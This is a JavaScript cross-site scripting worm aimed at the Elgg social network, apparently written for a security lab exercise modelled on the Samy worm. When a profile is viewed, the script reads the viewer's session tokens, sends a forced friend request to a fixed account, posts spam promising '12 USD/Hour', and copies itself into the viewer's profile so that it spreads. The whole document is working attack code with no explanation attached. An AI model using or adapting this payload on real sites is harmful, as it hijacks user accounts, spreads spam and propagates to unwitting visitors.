<script type="text/javascript" id="worm">
window.onload = function(){
   	var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
        var jsCode = document.getElementById("worm").innerHTML;
        var tailTag = "</" + "script>";
        var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);

       var ts = "&__elgg_ts="+elgg.security.token.__elgg_ts;
		var token = "&__elgg_token="+elgg.security.token.__elgg_token;
		var sendurl = "http://www.xsslabelgg.com/action/friends/add?friend=47"+token+ts;
		Ajax = new XMLHttpRequest();
		Ajax.open("GET",sendurl,true);
		Ajax.setRequestHeader("Host","www.xsslabelgg.com");
		Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
		Ajax.send();

    var ts = "&__elgg_ts="+elgg.security.token.__elgg_ts;
		var token = "&__elgg_token="+elgg.security.token.__elgg_token;
    var body = "&body=To earn 12 USD/Hour(!), visit now ";
    var link = "http://www.xsslabelgg.com/profile/samy/"
		var sendurl = "http://www.xsslabelgg.com/action/thewire/add";
    var content = token + ts + body + link;
	  if(elgg.session.user.guid != 47){
    var Ajax = null;
    Ajax = new XMLHttpRequest();
    Ajax.open("POST",sendurl,true);
    Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
    Ajax.send(content);
   	}

  	var guid = "&guid=" + elgg.session.user.guid;
  	var ts = "&__elgg_ts="+elgg.security.token.__elgg_ts;
  	var token = "&__elgg_token="+elgg.security.token.__elgg_token;
  	var name = "&name="+elgg.session.user.name;
  	var desc = "&description=Samy is my hero" + wormCode
  	desc +="&accesslevel[description]=2";  //4
  	var sendurl = "http://www.xsslabelgg.com/action/profile/edit";
  	var content = token + ts + name + desc + guid;
  	if(elgg.session.user.guid != 47)
  	{
  			var Ajax = null;
  			Ajax = new XMLHttpRequest();
  			Ajax.open("POST",sendurl,true);
  			Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
  			Ajax.send(content);
  	}
}
</script>
